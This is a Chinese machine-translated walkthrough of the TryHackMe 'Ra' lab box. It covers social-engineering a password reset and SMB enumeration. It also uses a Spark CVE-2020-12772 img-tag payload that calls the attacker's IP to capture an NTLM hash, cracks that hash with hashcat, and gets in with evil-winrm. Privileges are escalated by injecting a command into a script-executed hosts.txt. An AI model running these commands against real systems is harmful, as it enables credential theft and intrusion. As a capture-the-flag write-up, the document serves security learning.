<html>
<head>
<title>WalkThrough on Ra Box(THM)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Ra箱(THM)演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/walkthrough-on-ra-box-thm-a70b8e27f14?source=collection_archive---------1-----------------------#2021-07-08">https://infosecwriteups.com/walkthrough-on-ra-box-thm-a70b8e27f14?source=collection_archive---------1-----------------------#2021-07-08</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="96a6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们解决来自Tryhackme的名为“Ra”的盒子</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/d9f8bb883d9fc4739d9081916ed9a230.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EFK9NPtbNmgrU6CTyGmEtA.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">Ra徽标</figcaption></figure><h1 id="c693" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">渗透测试方法</h1><ol class=""><li id="a53e" class="lz ma iq jp b jq mb ju mc jy md kc me kg mf kk mg mh mi mj bi translated"><strong class="jp ir">侦察</strong></li><li id="247a" class="lz ma iq jp b jq mk ju ml jy mm kc mn kg mo kk mg mh mi mj bi translated"><strong class="jp ir">枚举</strong></li><li id="8160" class="lz ma iq jp b jq mk ju ml jy mm kc mn kg mo kk mg mh mi mj bi translated"><strong class="jp ir">剥削</strong></li><li id="2e4c" class="lz ma iq jp b jq mk ju ml jy mm kc mn kg mo kk mg mh mi mj bi translated"><strong class="jp ir">权限提升</strong></li></ol><p id="7977" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在<a class="ae mp" href="https://tryhackme.com/room/ra" rel="noopener ugc nofollow" target="_blank"> Tryhackme </a>访问此框</p><h1 id="df65" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated"><strong class="ak">侦察:- </strong></h1><p id="8fcf" class="pw-post-body-paragraph jn jo iq jp b jq mb js jt ju mc jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">Nmap:- Nmap扫描显示几个端口打开</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mt"><img src="../Images/22810de29018c3813895dc5c224421d7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MFxlhd_d-ZKloPUyz7iA9A.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">Nmap</figcaption></figure><ul class=""><li id="6c8b" class="lz ma iq jp b jq jr ju jv jy mu kc mv kg mw kk mx mh mi mj bi translated">浏览网页后，我们可以看到需要保存到<code class="fe my mz na nb b">/etc/hosts</code>中的<code class="fe my mz na nb b">fire.windcorp.thm</code>和<code class="fe my mz na nb b">windcorp.thm</code></li><li id="d41b" class="lz ma iq jp b jq mk ju ml jy mm kc mn kg mo kk mx mh mi mj bi translated">然后查看网页，有一个<code class="fe my mz na nb b">resetpassword</code>按钮提示安全问题</li></ul><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nc"><img src="../Images/b16fd73b484d1f6d630b373c948f91f8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hfXU2QElDAzGB6hBBFAzmA.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">重置密码页面</figcaption></figure><ul class=""><li id="a0f7" class="lz ma iq jp b jq jr ju jv jy mu kc mv kg mw kk mx mh mi mj bi translated">因此，要获得用户名和安全问题的答案，我们可以浏览网页并滚动到最后，我们可以看到员工列表和一个名为<code class="fe my mz na nb b">Lily levesque</code>的员工发布了她和她的狗的照片，狗的名字出现在图片URL(即sparky)上</li></ul><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nd"><img src="../Images/8eb6935cfca792bd33f7e3032df0daac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1398/format:webp/1*BHq662FFsnUR1z7a1EknHw.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">莉莉·莱维斯克(雇员)</figcaption></figure><ul class=""><li id="874c" class="lz ma iq jp b jq jr ju jv jy mu kc mv kg mw kk mx mh mi mj bi translated">通过粘贴用户名为<code class="fe my mz na nb b">Liliye</code>并将安全问题改为pet，答案为<code class="fe my mz na nb b">Sparky</code></li></ul><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ne"><img src="../Images/d4ab1f84a4b65ca49abe4adf3df35ddf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OCCNb6c_h_Ry6h8idrfUYg.png"/></div></div></figure><ul class=""><li id="678f" class="lz ma iq jp b jq jr ju jv jy mu kc mv kg mw kk mx mh mi mj bi translated">我们还得到了一个重置密码</li></ul><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nf"><img src="../Images/1bde869ed96dcabca8e77a29f799531e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dtUC612KUrD7t4yAdp3caA.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">密码已更改</figcaption></figure><h1 id="6221" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">枚举:-</h1><ul class=""><li id="a09e" class="lz ma iq jp b jq mb ju mc jy md kc me kg mf kk mx mh mi mj bi translated">因为我们知道149和445端口是打开的，也就是<code class="fe my mz na nb b">smb</code>，我们能做的就是使用<code class="fe my mz na nb b">smbmap</code>工具和liliye的用户名和密码来列出其中的所有目录</li><li id="5c64" class="lz ma iq jp b jq mk ju ml jy mm kc mn kg mo kk mx mh mi mj bi translated">我们使用这个命令<code class="fe my mz na nb b">smbmap -u lilyle -p Changeme#123 -R -H windcorp.thm</code>，由于这个工具执行递归搜索并提取所有目录，我列出了对我们来说重要的目录</li></ul><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ng"><img src="../Images/2770978513b27bcd79589c19788a457a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1332/format:webp/1*bfn7GkNCF1b-lClZ_8QPZQ.png"/></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">smbmap</figcaption></figure><ul class=""><li id="d807" class="lz ma iq jp b jq jr ju jv jy mu kc mv kg mw kk mx mh mi mj bi translated">现在，我们可以看到Flag1.txt位于<code class="fe my mz na nb b">Shared</code>文件夹中，所以我们使用<code class="fe my mz na nb b">smb-client</code>来列出文件<code class="fe my mz na nb b">smbclient \\windcorp.thm\Shared -U lilyle --password ChangeMe#1234</code>的内容</li></ul><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nh"><img src="../Images/8b838dfd7145964da90fe96d0712ccb4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eYcHK1t8YlCi4a-CX9YbNA.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">SMB客户端</figcaption></figure><ul class=""><li id="dca8" class="lz ma iq jp b jq jr ju jv jy mu kc mv kg mw kk mx mh mi mj bi translated">因为我们可以看到标志和spark文件，快速的谷歌搜索让我明白了什么是spark，它是一个在工具之间进行通信的即时通讯工具</li><li id="0a5a" class="lz ma iq jp b jq mk ju ml jy mm kc mn kg mo kk mx mh mi mj bi translated">我们还可以在<code class="fe my mz na nb b">Shared</code>文件夹中看到一个特定的版本，它指出这个过时的版本有特定的漏洞，我发现了<a class="ae mp" href="https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md" rel="noopener ugc nofollow" target="_blank">这个</a></li></ul><h1 id="67b4" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">剥削</h1><ul class=""><li id="eebc" class="lz ma iq jp b jq mb ju mc jy md kc me kg mf kk mx mh mi mj bi translated">通过运行Spark(2.8.3)和发送有效载荷<code class="fe my mz na nb b">&lt;img src="http://&lt;your-IP&gt;/image.jpg"</code>并打开响应器将捕获<code class="fe my mz na nb b">buse</code> NTLM散列</li></ul><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ni"><img src="../Images/eb8e342a22e058fa12e7d792d5b23181.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*t66_rlLIiSQVPFqG8B6tbA.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">混杂</figcaption></figure><ul class=""><li id="2f6d" class="lz ma iq jp b jq jr ju jv jy mu kc mv kg mw kk mx mh mi mj bi translated">然后在运行hashcat之后，我们得到破解的密码<code class="fe my mz na nb b">uzunLM+3131</code>，命令是<code class="fe my mz na nb b">hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt</code></li></ul><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nj"><img src="../Images/69fd33e97784ab16f78b7cb9fe92b29f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*L0HahtUo3BB_oHuGdLJbBw.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">密码</figcaption></figure><ul class=""><li id="44ed" class="lz ma iq jp b jq jr ju jv jy mu kc mv kg mw kk mx mh mi mj bi translated">既然我们知道用户名和密码，我们可以使用evil-winrm来获取访问权限，使用下面的命令<code class="fe my mz na nb b">evil-winrm -u buse -p uzunLM+3131 -i windcorp.thm</code></li></ul><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/33da305b200efc836f3d86fe94ae30f0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1204/format:webp/1*mD9Fn441hPOco24QS7alLA.png"/></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">邪恶-winrm</figcaption></figure><h1 id="5936" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">特权逃脱</h1><ul class=""><li id="5532" class="lz ma iq jp b jq mb ju mc jy md kc me kg mf kk mx mh mi mj bi translated">遍历到<code class="fe my mz na nb b">C:\&gt;</code>并列出内容会让我们明白有一个不寻常的文件叫做脚本，在列出脚本后，我们可以找到两个文件<code class="fe my mz na nb b">log.txt</code>和<code class="fe my mz na nb b">checkserver.pl1</code>。</li></ul><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nl"><img src="../Images/1b8f69e59ac2ce39b46ed67140792ccd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1364/format:webp/1*RZFqHhNHWPGMvC2JjiU3Iw.png"/></div></figure><ul class=""><li id="d645" class="lz ma iq jp b jq jr ju jv jy mu kc mv kg mw kk mx mh mi mj bi translated">查看log.txt和checkservers.ps1后，我们可以理解代码正在获取<code class="fe my mz na nb b">C:\Users\brittanycr\hosts.txt</code>并执行其中的命令</li><li id="003e" class="lz ma iq jp b jq mk ju ml jy mm kc mn kg mo kk mx mh mi mj bi translated">根据组信息，我们作为管理员拥有所有的访问权限，如创建、删除、编辑低特权用户，而我们不能做任何与管理员帐户相关的事情</li><li id="f5dc" class="lz ma iq jp b jq mk ju ml jy mm kc mn kg mo kk mx mh mi mj bi translated">因此，我们可以使用这个命令<code class="fe my mz na nb b">net user /domain &lt;user-name&gt; &lt;passoword&gt;</code>创建一个新用户</li><li id="379b" class="lz ma iq jp b jq mk ju ml jy mm kc mn kg mo kk mx mh mi mj bi translated">因为该用户没有管理员权限，我们无法将该访问权限设置为<code class="fe my mz na nb b">buse</code>用户。我们可以编辑Hosts.txt文件，并使用这个命令<code class="fe my mz na nb b">net localgroup Administrators hacker /add</code>更新它，这个命令改变了管理员的访问级别</li></ul><p id="cf64" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是，我们如何访问它呢？</p><ul class=""><li id="7772" class="lz ma iq jp b jq jr ju jv jy mu kc mv kg mw kk mx mh mi mj bi translated">我们可以使用Smbclient作为<code class="fe my mz na nb b">brittanycr</code>用户登录，并在那里编辑文件</li></ul><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nm"><img src="../Images/327ff34045db9f666333ed4f1ca6983c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1076/format:webp/1*rKDFOsLlGwEY--pdh5rn9A.png"/></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">SMB客户端</figcaption></figure><ul class=""><li id="6f4e" class="lz ma iq jp b jq jr ju jv jy mu kc mv kg mw kk mx mh mi mj bi translated">所以，这些就是我们编辑<code class="fe my mz na nb b">hosts.txt</code>文件的步骤</li></ul><ol class=""><li id="1c6e" class="lz ma iq jp b jq jr ju jv jy mu kc mv kg mw kk mg mh mi mj bi translated">使用<code class="fe my mz na nb b">get hosts.txt</code>将其下载到本地机器</li><li id="86e0" class="lz ma iq jp b jq mk ju ml jy mm kc mn kg mo kk mg mh mi mj bi translated">编辑我们主机上的文件，并添加<code class="fe my mz na nb b">net localgroup Administrators hacker /add</code></li><li id="2c17" class="lz ma iq jp b jq mk ju ml jy mm kc mn kg mo kk mg mh mi mj bi translated">在上传我们编辑过的文件之前，我们先用<code class="fe my mz na nb b">rm.txt</code>删除hosts.txt，然后用<code class="fe my mz na nb b">put hosts.txt</code>上传到那台机器上</li></ol><ul class=""><li id="a92a" class="lz ma iq jp b jq jr ju jv jy mu kc mv kg mw kk mx mh mi mj bi translated">上传hosts.txt之后，我们已经知道这个<code class="fe my mz na nb b">checkservers.ps1</code>每分钟运行一次，获取hosts.txt并在其中运行命令</li><li id="8eee" class="lz ma iq jp b jq mk ju ml jy mm kc mn kg mo kk mx mh mi mj bi translated">因此，大约一分钟后，我们的黑客帐户是管理员特权，所以我们可以使用evil-winrm作为黑客登录，并收到第三个标志</li></ul></div><div class="ab cl nn no hu np" role="separator"><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns"/></div><div class="ij ik il im in"><p id="ad38" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">就这些，感谢阅读</p></div></div>    
</body>
</html>